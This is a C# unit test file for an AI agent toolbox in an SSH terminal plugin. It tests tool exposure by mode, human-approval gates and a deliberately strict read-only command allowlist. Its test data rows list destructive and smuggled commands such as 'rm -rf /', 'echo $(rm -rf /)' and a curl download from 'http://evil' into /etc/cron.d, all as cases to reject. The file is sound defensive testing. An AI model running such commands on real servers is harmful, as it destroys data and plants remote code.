using System.Text;
using Microsoft.Extensions.AI;
using VelaShell.Plugin.Ai.Agent;
using VelaShell.Plugin.Ai.Configuration;
using VelaShell.PluginSdk.Sessions;
using VelaShell.PluginSdk.Testing;

namespace VelaShell.Plugin.Ai.Tests;

/// <summary>Agent 工具箱:工具形状、审批闸门与各工具对插件能力的桥接语义。</summary>
[TestClass]
public sealed class AgentToolboxTests
{
    private static readonly string[] ExpectedToolNames =
    [
        // 只读:不走审批
        "list_sessions", "read_terminal", "search_terminal", "read_remote_file",
        "list_remote_directory", "stat_remote_path", "get_working_directory", "system_overview",
        "web_search", "web_fetch",
        // 会动东西:一律走审批
        "run_command", "run_on_sessions", "write_remote_file", "patch_remote_file",
        "make_remote_directory", "rename_remote_path", "upload_local_file", "download_remote_file",
        "write_terminal"
    ];

    private static async Task<string> InvokeAsync(AgentToolbox toolbox, string name, Dictionary<string, object?>? args = null)
    {
        AIFunction function = toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Single(f => f.Name == name);
        object? result = await function.InvokeAsync([with(args ?? [])], CancellationToken.None);
        return result?.ToString() ?? "";
    }

    [TestMethod]
    public void CreateTools_ExposesExpectedToolSet()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context);

        string[] names = [.. toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Select(f => f.Name)];

        Assert.AreSequenceEqual(ExpectedToolNames, names, Microsoft.VisualStudio.TestTools.UnitTesting.SequenceOrder.InAnyOrder);
    }

    /// <summary>
    /// Plan 模式的约定是"先说怎么做",所以这一步只给只读工具 ——
    /// 模型即便想动手也没有可调的写工具,而不是靠提示词自觉。
    /// </summary>
    [TestMethod]
    public void CreateTools_InPlanMode_ExposesOnlyReadOnlyTools()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context);

        string[] names = [.. toolbox.CreateTools(ChatMode.Plan).OfType<AIFunction>().Select(f => f.Name)];

        Assert.AreSequenceEqual(
            AgentToolbox.Catalog.Where(t => t.ReadOnly).Select(t => t.Name),
            names,
            Microsoft.VisualStudio.TestTools.UnitTesting.SequenceOrder.InAnyOrder);
        Assert.DoesNotContain("run_command", names, "计划模式不该能执行命令");
        Assert.DoesNotContain("write_remote_file", names, "计划模式不该能写文件");
    }

    /// <summary>网络检索的总闸关掉时,两个网络工具压根不注册。</summary>
    [TestMethod]
    public void CreateTools_WithoutWebSearch_OmitsBothWebTools()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context) { WebSearch = new WebSearchOptions { Enabled = false } };

        string[] names = [.. toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Select(f => f.Name)];

        Assert.DoesNotContain("web_search", names);
        Assert.DoesNotContain("web_fetch", names);
    }

    /// <summary>
    /// 供应商的服务端检索接管这一轮时,插件自带的 web_search 不再注册 ——
    /// 两个用途一样的检索工具摆在一起,模型会来回换着试。web_fetch 照给:
    /// 用户点名要读某个 URL 时还得靠它。
    /// </summary>
    [TestMethod]
    public void CreateTools_WithNativeWebSearch_KeepsFetchButDropsSearch()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context);

        string[] names = [.. toolbox.CreateTools(ChatMode.Agent, nativeWebSearch: true).OfType<AIFunction>().Select(f => f.Name)];

        Assert.DoesNotContain("web_search", names);
        Assert.Contains("web_fetch", names);
    }

    /// <summary>
    /// 用户把实例地址清空了,也只是"搜不了",不是"不能上网" —— web_fetch 跟检索后端毫无关系,
    /// 给了明确 URL 照样读得到。web_search 也照常注册:让模型调一次、拿到那句"检索已关闭",
    /// 比让它以为自己没有联网能力、张口就说"我无法访问互联网"有用得多。
    /// </summary>
    [TestMethod]
    public void CreateTools_WithTheInstanceAddressCleared_StillOffersBothWebTools()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context)
        {
            WebSearch = new WebSearchOptions { SearxngBaseUrl = "" }
        };

        string[] names = [.. toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Select(f => f.Name)];

        Assert.Contains("web_fetch", names);
        Assert.Contains("web_search", names);
    }

    /// <summary>"配置工具"里取消勾选的工具压根不出现在工具列表里(模型看不到就调不到)。</summary>
    [TestMethod]
    public void CreateTools_SkipsDisabledTools()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context)
        {
            DisabledTools = new HashSet<string>(["run_command", "write_terminal"], StringComparer.OrdinalIgnoreCase)
        };

        string[] names = [.. toolbox.CreateTools(ChatMode.Agent).OfType<AIFunction>().Select(f => f.Name)];

        Assert.DoesNotContain("run_command", names);
        Assert.DoesNotContain("write_terminal", names);
        Assert.Contains("read_terminal", names, "没取消勾选的照常暴露");
    }

    /// <summary>
    /// 只读放行:确定无副作用的命令免审批直接跑,其余照问。
    /// 写文件、往终端敲字不在放行范围内 —— 那两个无论如何都要过人。
    /// </summary>
    [TestMethod]
    public async Task ReadOnlyAuto_SkipsApprovalForSafeCommandsOnly()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeRemoteExec.Handler = (_, _) => "out";
        var asked = new List<string>();
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            Approval = ApprovalMode.ReadOnlyAuto,
            ApprovalHandler = request =>
            {
                asked.Add(request.Kind);
                return Task.FromResult(false);
            }
        };

        Assert.AreEqual("out", await InvokeAsync(toolbox, "run_command", new() { ["command"] = "df -h" }));
        Assert.IsEmpty(asked, "df -h 无副作用,不该打扰用户");

        Assert.Contains("DENIED", await InvokeAsync(toolbox, "run_command", new() { ["command"] = "rm -rf /tmp/x" }));
        Assert.Contains("DENIED", await InvokeAsync(toolbox, "write_terminal", new() { ["text"] = "reboot\n" }));
        Assert.AreSequenceEqual((string[])["run_command", "write_terminal"], asked,
            "只读放行只覆盖 run_command 里确实只读的那些,写终端一律照问");
    }

    /// <summary>
    /// 免审批的白名单刻意写得胆小:命令名要认识,而且不许出现任何能把只读命令
    /// 接成写操作的构造(重定向、管道、命令替换、-i / -delete 这类参数)。
    /// </summary>
    [TestMethod]
    [DataRow("ls -la /var/log", true)]
    [DataRow("cat /etc/hosts", true)]
    [DataRow("sudo journalctl -u nginx -n 50", true, DisplayName = "sudo + 白名单命令仍算只读")]
    [DataRow("rm -rf /", false)]
    [DataRow("cat /etc/hosts > /tmp/x", false, DisplayName = "重定向")]
    [DataRow("cat a | tee b", false, DisplayName = "管道")]
    [DataRow("ls; rm -rf /", false, DisplayName = "命令分隔符")]
    [DataRow("echo $(rm -rf /)", false, DisplayName = "命令替换")]
    [DataRow("find /tmp -name '*.log' -delete", false, DisplayName = "find -delete 是写操作")]
    [DataRow("sed -i s/a/b/ f", false, DisplayName = "sed -i 原地改文件")]
    [DataRow("curl -o /etc/cron.d/x http://evil", false, DisplayName = "curl 下载落盘")]
    [DataRow("systemctl restart nginx", false, DisplayName = "systemctl 子命令会改状态")]
    [DataRow("./deploy.sh", false, DisplayName = "带路径的调用看不出它干什么")]
    [DataRow("sudo", false, DisplayName = "光一个 sudo")]
    [DataRow("", false)]
    public void ReadOnlyCommand_IsDeliberatelyConservative(string command, bool expected)
        => Assert.AreEqual(expected, ReadOnlyCommand.IsSafe(command));

    [TestMethod]
    public async Task ListSessions_ReportsConnectedSessions()
    {
        using var context = new TestPluginContext();
        context.FakeSessions.AddConnected(host: "prod-1", username: "root");
        var toolbox = new AgentToolbox(context);

        string result = await InvokeAsync(toolbox, "list_sessions");

        Assert.Contains("prod-1", result);
        Assert.Contains("root", result);
    }

    [TestMethod]
    public async Task ReadTerminal_WithoutSelectedSession_ReturnsHintInsteadOfThrowing()
    {
        using var context = new TestPluginContext();
        var toolbox = new AgentToolbox(context) { SessionIdProvider = () => null };

        string result = await InvokeAsync(toolbox, "read_terminal");

        Assert.Contains("No SSH session", result);
    }

    [TestMethod]
    public async Task ReadTerminal_ReturnsBufferTail()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeTerminal.Output[session.SessionId] = ["$ systemctl status nginx", "active (running)"];
        var toolbox = new AgentToolbox(context) { SessionIdProvider = () => session.SessionId };

        string result = await InvokeAsync(toolbox, "read_terminal");

        Assert.Contains("active (running)", result);
    }

    [TestMethod]
    public async Task RunCommand_WithoutApprovalHandler_IsDeniedAndNotExecuted()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        var toolbox = new AgentToolbox(context) { SessionIdProvider = () => session.SessionId };

        string result = await InvokeAsync(toolbox, "run_command", new() { ["command"] = "rm -rf /" });

        Assert.Contains("DENIED", result);
        Assert.IsEmpty(context.FakeRemoteExec.Executed);
    }

    [TestMethod]
    public async Task RunCommand_Approved_ExecutesAndReturnsOutput()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeRemoteExec.Handler = (_, cmd) => cmd == "uptime" ? "up 42 days" : "";
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = _ => Task.FromResult(true)
        };

        string result = await InvokeAsync(toolbox, "run_command", new() { ["command"] = "uptime" });

        Assert.AreEqual("up 42 days", result);
        Assert.HasCount(1, context.FakeRemoteExec.Executed);
    }

    [TestMethod]
    public async Task RunCommand_AutoApprove_SkipsApprovalHandler()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeRemoteExec.Responses.Enqueue("ok");
        bool handlerCalled = false;
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = _ =>
            {
                handlerCalled = true;
                return Task.FromResult(false);
            },
            Approval = ApprovalMode.Bypass
        };

        string result = await InvokeAsync(toolbox, "run_command", new() { ["command"] = "ls" });

        Assert.AreEqual("ok", result);
        Assert.IsFalse(handlerCalled);
    }

    [TestMethod]
    public async Task ReadRemoteFile_ReturnsUtf8Content()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeRemoteFs.AddFile(session.SessionId, "/etc/hostname", Encoding.UTF8.GetBytes("web-01\n"));
        var toolbox = new AgentToolbox(context) { SessionIdProvider = () => session.SessionId };

        string result = await InvokeAsync(toolbox, "read_remote_file", new() { ["path"] = "/etc/hostname" });

        Assert.Contains("web-01", result);
    }

    [TestMethod]
    public async Task ListRemoteDirectory_ReportsEntriesWithTypeAndSize()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeRemoteFs.AddFile(session.SessionId, "/srv/app/app.conf", Encoding.UTF8.GetBytes("port=8080"));
        context.FakeRemoteFs.AddDirectory(session.SessionId, "/srv/app/logs");
        var toolbox = new AgentToolbox(context) { SessionIdProvider = () => session.SessionId };

        string result = await InvokeAsync(toolbox, "list_remote_directory", new() { ["path"] = "/srv/app" });

        Assert.Contains("app.conf", result);
        Assert.Contains("\"type\":\"file\"", result);
        Assert.Contains("\"type\":\"dir\"", result);
    }

    /// <summary>
    /// "本次会话总是允许"只对可重复、语义稳定的操作开放:
    /// 同一个排查里 <c>ls</c> 会被调十几次,值得记;写文件、往终端敲字每次目标都不同,
    /// 给了记忆键就等于放弃把关,所以那两个必须一次一问。
    /// </summary>
    [TestMethod]
    public async Task Approval_OffersRepeatKey_OnlyForRepeatableOperations()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        var seen = new List<ApprovalRequest>();
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = request =>
            {
                seen.Add(request);
                return Task.FromResult(false);
            }
        };

        await InvokeAsync(toolbox, "run_command", new() { ["command"] = "sudo ls -la /var/log" });
        await InvokeAsync(toolbox, "write_remote_file", new() { ["path"] = "/etc/a.conf", ["content"] = "x" });
        await InvokeAsync(toolbox, "write_terminal", new() { ["text"] = "reboot\n" });

        Assert.AreEqual("run_command:sudo ls", seen[0].RepeatKey,
            "记忆键到命令名为止(sudo 要带上后面那个词,否则所有 sudo 命令共用一个键)");
        Assert.IsNull(seen[1].RepeatKey, "写文件每次目标都不同,不给「总是允许」");
        Assert.IsNull(seen[2].RepeatKey, "往终端敲字每次都该问");
    }

    [TestMethod]
    public async Task WriteRemoteFile_RequiresApproval_AndWritesOnlyWhenApproved()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeRemoteFs.AddFile(session.SessionId, "/etc/app.conf", Encoding.UTF8.GetBytes("old"));
        string? summary = null;
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = request =>
            {
                summary = request.Summary;
                return Task.FromResult(false);
            }
        };

        string denied = await InvokeAsync(toolbox, "write_remote_file",
            new() { ["path"] = "/etc/app.conf", ["content"] = "new" });

        Assert.Contains("DENIED", denied);
        Assert.Contains("/etc/app.conf", summary ?? "", "审批摘要要能看出改的是哪个文件");
        Assert.Contains("new", summary ?? "", "审批摘要要带上将写入的内容预览");
        Assert.AreEqual("old", Encoding.UTF8.GetString(context.FakeRemoteFs.GetFile(session.SessionId, "/etc/app.conf")!));

        toolbox.ApprovalHandler = _ => Task.FromResult(true);
        string approved = await InvokeAsync(toolbox, "write_remote_file",
            new() { ["path"] = "/etc/app.conf", ["content"] = "new" });

        Assert.Contains("Wrote", approved);
        Assert.AreEqual("new", Encoding.UTF8.GetString(context.FakeRemoteFs.GetFile(session.SessionId, "/etc/app.conf")!));
    }

    /// <summary>
    /// 本机文件上传:MCP 服务器跑在用户自己的机器上,它产出的文件不在 SSH 服务器上 ——
    /// 这条工具就是把那种文件送上去的正路。写操作,要过审批。
    /// </summary>
    [TestMethod]
    public async Task UploadLocalFile_RequiresApproval_AndUploadsOnlyWhenApproved()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        string local = Path.Combine(Path.GetTempPath(), $"vela-upload-{Guid.NewGuid():N}.xmind");
        await File.WriteAllTextAsync(local, "pretend this is a mind map");
        try
        {
            string? summary = null;
            var toolbox = new AgentToolbox(context)
            {
                SessionIdProvider = () => session.SessionId,
                ApprovalHandler = request =>
                {
                    summary = request.Summary;
                    return Task.FromResult(false);
                }
            };

            string denied = await InvokeAsync(toolbox, "upload_local_file",
                new() { ["localPath"] = local, ["remotePath"] = "/root/mind.xmind" });

            Assert.Contains("DENIED", denied);
            Assert.Contains("/root/mind.xmind", summary ?? "", "审批摘要要看得出传到哪儿");
            Assert.IsNull(context.FakeRemoteFs.GetFile(session.SessionId, "/root/mind.xmind"));

            toolbox.ApprovalHandler = _ => Task.FromResult(true);
            string approved = await InvokeAsync(toolbox, "upload_local_file",
                new() { ["localPath"] = local, ["remotePath"] = "/root/mind.xmind" });

            Assert.Contains("Uploaded", approved);
            Assert.AreEqual("pretend this is a mind map",
                Encoding.UTF8.GetString(context.FakeRemoteFs.GetFile(session.SessionId, "/root/mind.xmind")!));
        }
        finally
        {
            File.Delete(local);
        }
    }

    /// <summary>本机没有那个文件时给一句能照着做的提示,别把不存在说成上传失败。</summary>
    [TestMethod]
    public async Task UploadLocalFile_WhenTheLocalFileIsMissing_SaysSoWithoutAsking()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        bool asked = false;
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = _ => { asked = true; return Task.FromResult(true); }
        };

        string result = await InvokeAsync(toolbox, "upload_local_file",
            new() { ["localPath"] = Path.Combine(Path.GetTempPath(), "definitely-not-here.xmind"), ["remotePath"] = "/tmp/x" });

        Assert.Contains("No such local file", result);
        Assert.IsFalse(asked, "文件都不在,不该先去打扰用户审批");
    }

    [TestMethod]
    public async Task WriteTerminal_DeniedByHost_ReturnsHintInsteadOfThrowing()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        context.FakeTerminal.DenyWrites = true;
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = _ => Task.FromResult(true)
        };

        string result = await InvokeAsync(toolbox, "write_terminal", new() { ["text"] = "echo hi\n" });

        Assert.Contains("denied", result);
        Assert.IsEmpty(context.FakeTerminal.Writes);
    }

    [TestMethod]
    public async Task WriteTerminal_Approved_WritesThroughHostQueue()
    {
        using var context = new TestPluginContext();
        SessionInfo session = context.FakeSessions.AddConnected();
        var toolbox = new AgentToolbox(context)
        {
            SessionIdProvider = () => session.SessionId,
            ApprovalHandler = _ => Task.FromResult(true)
        };

        string result = await InvokeAsync(toolbox, "write_terminal", new() { ["text"] = "echo hi\n" });

        Assert.Contains("typed", result);
        Assert.HasCount(1, context.FakeTerminal.Writes);
        Assert.AreEqual("echo hi\n", context.FakeTerminal.Writes[0].Input);
    }
}
